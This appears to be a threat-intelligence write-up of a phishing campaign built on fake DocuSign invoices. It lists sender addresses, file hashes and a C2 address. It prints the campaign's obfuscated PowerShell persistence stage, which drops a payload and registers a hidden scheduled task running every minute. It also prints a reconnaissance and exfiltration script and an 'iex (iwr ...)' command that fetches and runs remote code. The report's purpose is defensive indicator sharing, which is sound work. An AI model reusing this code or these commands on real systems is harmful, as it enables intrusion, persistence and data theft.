THREAT IDENTIFICATION:  UNKNOWN MALWARE 

SUBJECTS OBSERVED
Payable Bill Reminder 03/08/2023
Unsettled Purchase Reminder 03/08/2023

SENDERS OBSERVED
adamm@invoice.ridingstone.com
erina@invoice.ridingstone.com

PDF FILE HASHES
Invoice_DocuSign-Mar03-2023-69968.html
9109b97d13c9bf404746c748b76ce9c0

Invoice_DocuSign-Mar03-2023-3948905.html
a442c6c8311e05a77d9b63f2e2a3ed4f
(All file that I saw were named: "Invoice_DocuSign-Mar03-2023-[0-9]{5,7}\.html" )

ZIP FILE HASHES
39523c2a4e1a20f74af8e161ca7ca12c
(All files I saw were name "Invoice-DocuSign-Mar03-2023.zip")

JS FILE HASHES
fb75ce9bd9547e32875730ce9d991bc0
(All files I saw were name "Invoice-DocuSign-Mar03-2023.js")

FINAL SCRIPT STAGE
 sEt-Item  ("Varia"+"bLe:X"+"UVN")  (  [tyPE]("{0}{1}{2}{4}{3}{5}" -f 'syStEm.T','E','xt.','Co','EN','diNg')  ) ;    Sv HxS49  (  [TYpE]("{2}{1}{0}" -f 'nvERt','O','sYstEm.C') )  ;  Set-iTEm ('VariA'+'Bl'+'e:8'+'0FZ'+'2') ([TyPe]("{1}{2}{0}"-f 'e','iO.F','iL') ) ;.("{2}{0}{1}"-f 'o','de','Set-StrictM') -Version 2
function EA`QG`N`xOtke (${M`FLM`An},${F`HFb`yy}) {
    for (${o`Fmg`Sj} = 0; ${OFmg`SJ} -lt ${MFL`m`AN}."co`Unt"; ${of`M`GSJ}++) {
       ${m`FlmAN}[${OfM`GsJ}] = (${MFl`Man}[${oFMG`sJ}] -bxor ${fHf`Byy})
    }
    return   ( vARIaBlE ('x'+'UVN')  -vALuE  )::"aSC`ii"."ge`TsTri`NG"(${mFl`mAn})
}
function O`VqJb`TqX {return (1..16 | &('%'){ '{0:X}' -f (&("{2}{0}{1}" -f 'and','om','Get-R') -Max 16) }) -join ''}
${OVcE`N`on} = (&("{2}{0}{1}{3}"-f'AqGn','X','E','Otke') ([System.Byte[]] @(0x3c,0x20,0x20,0x24,0x6e,0x7b,0x7b,0x65,0x61,0x6d,0x7a,0x66,0x66,0x67,0x7a,0x65,0x64,0x65,0x7a,0x62,0x61,0x7b,0x26,0x7b)) 84)
${U`oo`zxPHHeo} = (.("{0}{2}{1}"-f'EA','nXOtke','qG') ([System.Byte[]] @(0x4f,0x48,0x59)) 42)
${n`LE`NdHIVr} = (.("{2}{0}{1}" -f'XO','tke','EAqGn') ([System.Byte[]] @(0x3c,0x6d,0x3,0x32,0x32,0x6,0x23,0x36,0x23,0x6d,0xe,0x2d,0x21,0x23,0x2e,0x6d,0xf,0x2b,0x21,0x30,0x2d,0x31,0x2d,0x24,0x36,0x6d,0x15,0x2b,0x2c,0x26,0x2d,0x35,0x31,0x6d,0x12,0x2d,0x35,0x27,0x30,0x11,0x2a,0x27,0x2e,0x2e,0x6d)) 66)
&('cd') ${NlEN`DhI`Vr}
${W`NWf} = (&("{2}{1}{0}"-f 'JBTqX','VQ','O'))+(.("{1}{0}{2}{3}"-f 'A','E','qGnXOtk','e') ([System.Byte[]] @(0x4a,0x12,0x6,0x17)) 100)
${of`mGsjQxxPuw`iwd} = (.("{1}{0}"-f'd','pw')).("{2}{1}{0}" -f'ing','Str','To').Invoke() + '\' + ${W`Nwf}
${gT`jR} = (&("{0}{1}"-f'OVQJBTq','X')) + (&("{2}{1}{0}"-f 'qX','T','OVQJB'))
${lt`B`oFjr} = $(.("{0}{1}"-f 'wh','oami'))
${U`oOZx} = (&("{1}{2}{0}" -f'e','EAqGnXOt','k') ([System.Byte[]] @(0x66,0x46,0x7e,0x6,0x76,0x79,0x5b,0x6b,0x66,0xc,0x75,0x4f,0x5c,0x77,0x6e,0x4a,0x6e,0x67,0x75,0x51,0x5b,0x68,0xe,0x53,0x5d,0x51,0x6d,0x45,0x74,0x7b,0x7e,0x4f,0x7c,0x51,0x71,0x53,0x5b,0x7c,0x7d,0x45,0x76,0x7b,0xf,0x58,0x6e,0xc,0x75,0x53,0x66,0x67,0x6d,0x53,0x6b,0xd,0x75,0x4e,0x65,0x68,0x71,0xf,0x74,0x7c,0x75,0x67,0x6a,0xd,0x71,0x46,0x5e,0x67,0x7d,0xf,0x73,0x53,0x71,0x50,0x65,0x68,0x47,0x4c,0x76,0x56,0x54,0x74,0x5c,0x46,0xa,0x6c,0x5b,0x68,0xb,0x58,0x76,0x51,0x7d,0x49,0x5b,0xd,0x69,0x46,0x5c,0xd,0x57,0x53,0x5d,0x78,0x48,0x4a,0x65,0x67,0x57,0x53,0x76,0x7c,0xe,0x53,0x5a,0x78,0x69,0x55,0x76,0x78,0x75,0xa,0x5c,0x78,0x79,0x45,0x5c,0x46,0x7e,0x56,0x76,0x7c,0x66,0x58,0x66,0x46,0x48,0x48,0x7c,0x58,0x2,0x2)) 63);
${fYy`pC`Ehp} =  (Gi vaRiABle:hxs49  ).VAluE::("{2}{0}{3}{1}"-f'e64','ring','FromBas','St').Invoke(${Uoo`ZX})
  (GEt-VaRiAbLe  ("80Fz"+"2") ).vAlUe::("{2}{4}{0}{1}{3}"-f'l','byt','w','es','riteal').Invoke(${oFMGSJ`Q`xXPu`wiwD},${FyyP`Ce`hP});
${yOXlb`M`VyT} = (&("{0}{1}" -f 'pw','d')).("{1}{0}"-f 'ng','ToStri').Invoke() + '\'
${CO`Mpba`oSg} = (&("{1}{2}{0}"-f 'qX','OVQJB','T'))
${yT`Jc`cKK`VV} = '"' + (.("{2}{0}{1}"-f 'GnXOt','ke','EAq') ([System.Byte[]] @(0x50,0x5c,0x41,0x19,0x11,0x50,0x4e,0x4b,0x19,0x14,0x4c,0x4a,0x5c,0x5b,0x19)) 57) + "$OvcEnOn$UooZXpHhEO/$cOMPbAOSG)" + '"' 
${tT`ArZ`OS} = .("{5}{3}{0}{4}{2}{1}{6}" -f 'ed','io','Act','Schedul','Task','New-','n') -Execute "$yoXLbMVYt$WnWf" -Argument ${yTj`cC`k`kvV}
${npXjW`N`ThR} = .("{5}{0}{2}{6}{1}{3}{4}"-f 'ch','nc','e','ipa','l','New-S','duledTaskPri') "$LtbofJR"
${zKkhr`z`Bp} = &("{2}{5}{0}{1}{4}{3}"-f'dul','e','New-','er','dTaskTrigg','Sche') -Once -At (&("{0}{1}{2}" -f'Get-','Dat','e')) -RepetitionInterval (&("{1}{3}{0}{2}" -f 'w-','N','TimeSpan','e') -Minutes 1) -RepetitionDuration (&("{3}{1}{0}{2}" -f'imeSpa','ew-T','n','N') -Days(365))
${gp`O`m`weLnXB} = &("{3}{4}{0}{6}{5}{2}{1}"-f 'h','sSet','g','New-','Sc','duledTaskSettin','e') -Hidden -MultipleInstances ("{1}{0}" -f'l','Paralle') -AllowStartIfOnBatteries
&("{1}{2}{3}{0}"-f 'dTask','Register-S','chedu','le') -TaskName ${Gt`JR} -Action ${TTa`R`ZOS} -Trigger ${Zkkhrz`BP} -Settings ${GPomWe`lN`XB}

EXTRACTED FROM PCAP
$FEhAIPnKYc = "http://159.223.101.65/c/82CB28C63985286A"
$jDerOWQpqn =  - join ((65..90)  +  (97..122) | Get - Random  - Count 32 | % {
    [char]$_
}

)
function encode($ehClNZWanc, $XqxbeQnlmA) {
    try {
        $lawCmTDQzx = ""
        $aBGACwYRXR = 0
        $cFQQJeUnZK = $XqxbeQnlmA.ToCharArray()
        $ehClNZWanc.ToCharArray() | foreach - object  - process {
            $lawCmTDQzx += [System.String]::Format("{0:X2}", [System.Convert]::ToUInt32([char]([byte][char]$_  - bxor $cFQQJeUnZK[$aBGACwYRXR])))
            $aBGACwYRXR += 1
            if ($aBGACwYRXR  - eq $XqxbeQnlmA.Length)  {
                $aBGACwYRXR = 0
            }

        }

        return $lawCmTDQzx
    } catch {
        return ""
    }
}

$QMeszwXQcv = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
$nEHRTxlSlI = $(whoami)
if ($QMeszwXQcv)  {
    $nEHRTxlSlI = $nEHRTxlSlI  +  '(admin)'
}

$ynUfqpQAaA = 'Windows '  +  [string]$([System.Environment]::OSVersion.Version.Major)
$ULbcqlIQjs = ($(systeminfo)|out - string)
$ULbcqlIQjs += ($(whoami  / all)|out - string)
$ULbcqlIQjs += ($(nltest  / domain_trusts)|out - string)
$eOdlBeCMvs = (Get - WmiObject  - Class Win32_ComputerSystem).PartOfDomain
if ($eOdlBeCMvs)  {
    $tWAQYSCWxZ = (Get - WmiObject  - Class Win32_ComputerSystem).Domain
} else {
    $tWAQYSCWxZ = (Get - WmiObject  - Class Win32_ComputerSystem).Workgroup
}

$JrPcgsAAiM = ($(tasklist)|out - string)
$ZKfvBIipMg = (Get - WmiObject  - Class Win32_Product|Out - String)
$HFiTcXXLfB = @ {
    os = (encode $ynUfqpQAaA $jDerOWQpqn)
    user = (encode $nEHRTxlSlI $jDerOWQpqn)
    systeminfo = (encode $ULbcqlIQjs $jDerOWQpqn)
    domain = (encode $tWAQYSCWxZ $jDerOWQpqn)
    ps = (encode $JrPcgsAAiM $jDerOWQpqn)
    software = (encode $ZKfvBIipMg $jDerOWQpqn)
    magic = $jDerOWQpqn
}

LIKELY C2
http://159.223.101.65/r/ebs/82CB28C63985286A

SCHEDULED TASK INFORMATION
Scheduled Task Name:
8D3114D383410906D89388D3C8B7B66D

Program/Script:
C:\Users\analyst\AppData\Local\Microsoft\Windows\PowerShell\9B69C86773F47888.vbs

Arguments:
"iex (iwr -useb http://159.223.101.65/r/ebs/82CB28C63985286A)"

Runs every minute

ADDITIONAL RESOURCES
https://tria.ge/230224-vjmxysab33




